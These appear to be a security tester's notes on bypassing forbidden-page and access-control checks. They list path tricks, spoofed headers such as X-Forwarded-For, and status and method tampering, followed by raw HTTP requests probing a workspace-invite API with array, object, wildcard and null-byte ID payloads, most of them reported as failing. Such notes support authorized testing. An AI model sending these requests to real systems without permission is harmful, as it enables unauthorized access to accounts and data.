1) Change response status to 302, 200 etc.
	Ex- Change response to 302 /dashboard (to pwn admin panel)
2) Change request method 
	GET --> POST, TRACE
3) Brute with target specific wordlist (server on which website is running)
4) Lauka bypass-url-parser
5) Append these
	```
	/secret/*
	/secret/./
	/secret/
	xyz.com/%2f/secret.txt/
	xyz.com/%2e/secret.txt/
	```
5) Access .htaccess and use with X-Forwarded-For
6) [[Headers]] to append
	X-Forwarded-For (To show the origin IP or domain. In value append starting domain or allowed IP range(.htaccess etc))
	X-Original-URL
	X-Rewrite-URL
7) 1: Wrap ID with an array

 Send an array of workspace IDs. 

```HTTP
POST /workspaces/[60c30f178747147d9acd89ba]/users?sendEmail=true HTTP/1.1
Host: global.api.host.com
Content-Type: application/json
X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>

{"emails":["random@gmail.com"],"captchaValue":"_"}
```

 An array of Emails. 

The email is sent as an array by default, so let's try changing it to a nested array.

```HTTP
POST /workspaces/60c30f178747147d9acd89ba/users?sendEmail=true HTTP/1.1
Host: global.api.host.com
Content-Type: application/json
X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>


{"emails":[["random@gmail.com"]],"captchaValue":"_"}
```

2: Wrap ID with a JSON object

```HTTP
POST /workspaces/{"id":"60c30f178747147d9acd89ba"}/users?sendEmail=true HTTP/1.1
Host: global.api.host.com
Content-Type: application/json
X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>


{"emails":["random@gmail.com"],"captchaValue":"_"}
```

Send the email as a json object
```HTTP
POST /workspaces/60c30f178747147d9acd89ba/users?sendEmail=true HTTP/1.1
Host: global.api.host.com
Content-Type: application/json
X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>


{"emails":[{"email": "random@gmail.com"}],"captchaValue":"_"}
```

```
POST /workspaces/60c30f178747147d9acd89ba/users?sendEmail=true HTTP/1.1
Host: global.api.host.com
Content-Type: application/json
X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>


{"emails":{"email":"random@gmail.com"},"captchaValue":"_"}
```
3: Change the request method
I tried changing every `POST` request to `DELETE`, `PUT`, and `PATCH`. But it failed by showing a `405 method not allowed` error.
```HTTP
PUT /workspaces/<workspace_ID>/users?sendEmail=true HTTP/1.1
...
...
```
```HTTP
PATCH /workspaces/<workspace_ID>/users?sendEmail=true HTTP/1.1
...
...
```
```HTTP
DELETE /workspaces/<workspace_ID>/users?sendEmail=true HTTP/1.1
...
...
```
4: Add/Change the API version in the route

We need to check if older versions of API exist by adding `/v1/`, `/v2/`, or `/v3/` to the route. I tested all API versions since there were no version numbers sent in this API request by default.

```HTTP
POST /v1/workspaces/<workspace_ID>/users?sendEmail=true HTTP/1.1
...
...
```

```HTTP
POST /v2/workspaces/<workspace_ID>/users?sendEmail=true HTTP/1.1
...
...
```

I got nothing except the server's `404 Not Found` error response while playing with API versions.

5: IDs as a wildcard character

Sometimes replacing the IDs, emails, or usernames with a wildcard character would cause some strange responses from the server. For example, `*` means "All", so replacing an ID with a `*` character in a request would mean doing the same thing for all the IDs in the database instead of just one.

As in the example request given below, I tried to replace the workspace ID with a `*` character to check if I can invite a new user into every workspace out there in the target application. Unfortunately, the only response I'm getting from the server was a `404 Not Found` error.

```HTTP
POST /workspaces/*/users?sendEmail=true HTTP/1.1
Host: global.api.host.com
Content-Type: application/json
X-Auth-Token: ....


{"emails":["myEmail@gmail.com"],"captchaValue":"_"}
```

6 Add URL encoded null characters: 

```HTTP
POST /workspaces/60c30f178747147d9acd89ba%00/users?sendEmail=true HTTP/1.1
Host: global.api.host.com
Content-Type: application/json
X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>


{"emails":["random@gmail.com"],"captchaValue":"_"}
```

We get some weird responses sometimes from the server by adding null characters in the requests. Try adding `%00` in the URL, request data, header, etc. However, this API and server handled every null character carefully.
	